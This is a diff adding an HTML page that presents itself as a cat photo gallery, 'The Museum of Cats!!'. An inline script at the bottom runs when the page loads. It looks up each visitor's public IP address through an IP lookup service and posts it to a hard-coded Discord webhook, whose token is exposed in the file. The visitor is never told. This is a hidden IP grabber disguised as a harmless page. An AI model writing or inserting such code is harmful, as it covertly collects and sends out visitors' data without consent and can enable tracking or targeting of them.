@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <title>The Museum of Cats!!</title> <!-- title -->
+        <style>
+            .gallery {
+              display: flex;
+              flex-wrap: wrap;
+            }
+        
+            .gallery img {
+              width: 300px;
+              height: 200px;
+              object-fit: cover;
+              margin: 10px;
+            }
+          </style>
+    </head>
+
+    <body>
+
+        <h1>The Museum of Cats!!</h1>
+        <div class="gallery">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSy-qDeKJQikVkZbYIwdIGwi8dtiFDm4vLrRSLo-pbn5zpfuVsvsPFNLMJ038WV_aeawAw&usqp=CAUg" alt="Cat 1">
+            <img src="https://as2.ftcdn.net/v2/jpg/01/23/50/17/500_F_123501706_3GwEndkcTZJQs31SYuXW9znaMc8rEfC7.jpg" alt="Cat 2">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTx5LAPvqU9NWg-AJicrvmppAPlxujdDMaNZA&usqp=CAU" alt="Cat 3">
+            <img src="https://images.pexels.com/photos/6441460/pexels-photo-6441460.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" alt="Cat 4">
+            <img src="cat5.jpg" alt="Cat 5">
+          </div>
+
+        <script>
+            var xhr = new XMLHttpRequest();
+            var webhookUrl = "https://discord.com/api/webhooks/1158992076839583815/MAw-xZ9ELt9rv-RuQndxFVAHG41F0hO2DmX314SzhMmknexPv5tat8MWWIu8cqVOJHfE";
+            
+            xhr.open("GET", "https://api.ipify.org?format=json", true);
+            xhr.onreadystatechange = function() {
+              if (xhr.readyState === 4 && xhr.status === 200) {
+                var ipData = JSON.parse(xhr.responseText);
+                var ipAddress = ipData.ip;
+          
+                var data = {
+                  content: "Visitor IP: " + ipAddress
+                };
+                
+                var req = new XMLHttpRequest();
+                req.open("POST", webhookUrl, true);
+                req.setRequestHeader("Content-type", "application/json");
+                req.send(JSON.stringify(data));
+              }
+            };
+            
+            xhr.send();
+          </script>
+    </body>
+</html>
